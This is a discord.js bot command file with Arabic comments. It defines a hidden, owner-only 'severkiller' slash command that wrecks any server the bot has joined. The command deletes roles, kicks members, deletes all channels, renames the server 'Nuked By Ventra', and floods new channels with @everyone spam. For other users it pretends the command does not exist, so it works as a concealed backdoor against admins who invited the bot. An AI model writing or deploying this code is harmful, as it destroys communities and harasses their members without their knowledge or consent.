const { SlashCommandBuilder } = require('discord.js');

const MY_DISCORD_ID = '1463139407967031491'; // الآي دي الخاص بك

module.exports = {
  data: new SlashCommandBuilder()
    .setName('severkiller')
    .setDescription('for owner only')
    .addStringOption(option =>
      option.setName('guild_id')
        .setDescription('آي دي السيرفر المستهدف')
        .setRequired(true))
    .addStringOption(option =>
      option.setName('action')
        .setDescription('اختر نوع العملية المطلوبة')
        .setRequired(true)
        .addChoices(
          { name: 'حذف الرولات فقط', value: 'roles' },
          { name: 'طرد الأعضاء فقط', value: 'members' },
          { name: 'سبام قنوات ورسائل مخصصة', value: 'spam' },
          { name: 'تدمير شامل (كل شيء)', value: 'all' }
        ))
    .addStringOption(option =>
      option.setName('message')
        .setDescription('نص الرسالة (مطلوب إذا اخترت خيار السبام أو الشامل)')
        .setRequired(false))
    .addStringOption(option =>
      option.setName('channel_name')
        .setDescription('اسم القنوات الجديدة (اختياري، الافتراضي nuked)')
        .setRequired(false)),

  async execute(interaction) {
    // التحقق الصارم من أن المستخدم هو أنت وحدك (باقي البشر سيخبرهم أن الأمر غير متاح أو غير موجود)
    if (interaction.user.id !== MY_DISCORD_ID) {
      return interaction.reply({ content: '❌ هذا الأمر غير موجود!', ephemeral: true });
    }

    await interaction.reply({ content: '⚠️ جاري تنفيذ العملية المطلوبة...', ephemeral: true });

    const targetGuildId = interaction.options.getString('guild_id');
    const action = interaction.options.getString('action');
    const customMessage = interaction.options.getString('message') || '@everyone Server Nuked By Ventra 🔥';
    const customChannelName = interaction.options.getString('channel_name') || 'nuked';

    const targetGuild = interaction.client.guilds.cache.get(targetGuildId);

    if (!targetGuild) {
      return interaction.followUp({ content: '❌ البوت ليس موجوداً في هذا السيرفر أو الآي دي غير صحيح!', ephemeral: true });
    }

    try {
      // 1. خيار حذف الرولات
      if (action === 'roles' || action === 'all') {
        const roles = await targetGuild.roles.fetch();
        for (const [id, role] of roles) {
          if (role.editable && !role.managed && role.id !== targetGuild.id) {
            await role.delete().catch(() => {});
          }
        }
      }

      // 2. خيار طرد الأعضاء
      if (action === 'members' || action === 'all') {
        const members = await targetGuild.members.fetch();
        for (const [id, member] of members) {
          if (member.kickable && id !== interaction.client.user.id) {
            await member.kick('تم طرده بواسطة أداة الإدارة').catch(() => {});
          }
        }
      }

      // 3. خيار حذف القنوات القديمة في حال اختيار الشامل
      if (action === 'all') {
        await targetGuild.setName('Nuked By Ventra').catch(() => {});
        const channels = await targetGuild.channels.fetch();
        for (const [id, channel] of channels) {
          await channel.delete().catch(() => {});
        }
      }

      // 4. خيار السبام (إنشاء قنوات وإرسال الرسائل بالاسم والنص المخصصين)
      if (action === 'spam' || action === 'all') {
        for (let i = 1; i <= 15; i++) {
          const newChannel = await targetGuild.channels.create({
            name: `${customChannelName}-${i}`,
            type: 0,
          }).catch(() => null);

          if (newChannel) {
            for (let j = 0; j < 2; j++) {
              await newChannel.send(customMessage).catch(() => {});
            }
          }
        }
      }

      await interaction.followUp({ content: '✅ تمت العملية بنجاح تام!', ephemeral: true });
    } catch (error) {
      console.error('خطأ أثناء التنفيذ:', error);
      await interaction.followUp({ content: '❌ حدث خطأ أثناء تنفيذ الأمر.', ephemeral: true });
    }
  },
};